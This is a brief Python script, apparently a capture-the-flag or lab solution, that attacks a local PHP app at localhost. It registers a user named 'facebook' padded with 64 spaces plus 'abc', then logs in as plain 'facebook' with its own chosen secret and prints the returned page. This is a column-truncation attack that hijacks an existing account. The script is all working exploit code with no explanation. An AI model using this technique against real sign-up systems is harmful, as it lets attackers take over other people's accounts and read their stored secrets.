import requests
import random, string
x = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))

URL = "http://localhost/"

secret = "aA11111111" + x

# Registering a user
requests.post(url = "%s/add.php" % URL, data = {
  'name': 'facebook' + ' '*64 + 'abc',
  'secret': secret,
  'description': 'desc',
  })

r = requests.post(url = "%s/view.php" % URL, data = {
  'name': 'facebook',
  'secret': secret,
  })

print(r.text)
